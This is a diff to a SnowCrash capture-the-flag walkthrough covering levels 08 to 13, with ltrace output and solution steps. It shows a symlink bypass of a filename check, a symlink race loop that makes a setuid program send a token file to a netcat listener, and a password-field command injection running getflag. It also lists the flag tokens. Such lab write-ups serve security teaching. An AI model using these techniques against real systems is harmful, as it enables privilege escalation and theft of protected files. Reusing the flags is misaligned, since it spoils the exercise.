@@ -286,6 +286,20 @@ level07@SnowCrash:~$ ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 ```
 ## Level 08
+In this level, we have a level08 file and a token file in our home directory.
+When we launch the program with ltrace we see that the program use strstr to avoid token filename.
+
+```bash
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                         = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)     = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
+
+We only have to do a symbolic link to bypass this restriction
 
 ```bash
 level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/link && ./level08 /tmp/link
@@ -293,24 +307,88 @@ quif5eloekouj29ke0vouxean
 ```
 ## Level 09
 
+In this level, we have a program that takes an argument and increments by one all characters we write by incrementation.
+It use the Rolling Cipher
+For example: abc = ace
+
 ```bash
 scp -P 4242 level09@192.168.56.101:~/token ~/Desktop
 ```
+
+We make a script to apply this rule of incrementation
 
 ```bash
 su flag09 -> f3iji1ju5yuevaus41q1afiuq
 getflag
 ```
-## Level 10
+##Level 10
 
-f3iji1ju5yuevaus41q1afiuq
-
-
-## Level 11
+In this level, we have an executable which will send a file to a remote host.
 
 ```bash
-level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: && getflag > /tmp/flag
+ls -l
+        -rwsr-s---+ 1 flag10 level10 8617 Mar  5  2016 level10
+        -rw-------  1 flag10 flag10    26 Mar  5  2016 token
+```
+We can create a symlink to try to read the content in the token file (symlink race)
+
+```bash
+ln -s /home/user/level10/token /tmp/flag
+```
+Now let's try to send my file to the server
+
+```bash
+./level10 /tmp/flag 192.168.56.101
+```
+You don't have access to /tmp/flag
+```bash
+cat /tmp/flag
+    cat: /tmp/flag: Permission denied
+```
+
+Nope, still unable to execute my flag and send it to a server
+
+To open a port in your machine:
+```bash
+nc -lk 6969
+```
+
+let's get the executable to my host with scp
+
+```bash
+scp -P 4242 level10@192.168.56.101:/tmp/flag /mnt/nfs/homes/emaugale/Desktop
+```
+
+So must find a way to make your file accessible to the server.
+When we use ltrace, the executable will first try to access our file and then read the file's content. -> Do a /tmp/flag file with nothing on it when accessed; we can delete it and recreate one, which will be a symlink to the token file, launch our server, and print the result
+
+```bash
+    while true;
+        do
+        touch /tmp/link
+        rm -f /tmp/link
+        ln -s /home/user/level10/token /tmp/link
+        rm -f /tmp/link
+        done
+```
+
+```bash
+    while true;
+    do
+    /home/user/level10/level10 /tmp/link 192.168.56.101 2> /dev/null
+    done
+...
+bash /tmp/script1.sh & bash /tmp/script2.sh
+```
+
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+## Level 11
+In this exercise, we have a lua script. This script is a sort of a server that will listen to a port and compare the content you give it with an expected hash.
+
+As level07 user, you can use the getflag function to get the flag, but this time by adding it to the password Password:
+
+```bash
+Password: "; getflag > /tmp/flag"
 ```
 
 ```bash
@@ -349,7 +427,7 @@ Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 ## Level 13
 
-We can reverse the program with Ghidra and see that the flag is in a function named ft_des.
+We can reverse the program with Ghidra and see that the flag is in a function named ft_des. 
 
 ```bash
 ➜  Documents ./a.out
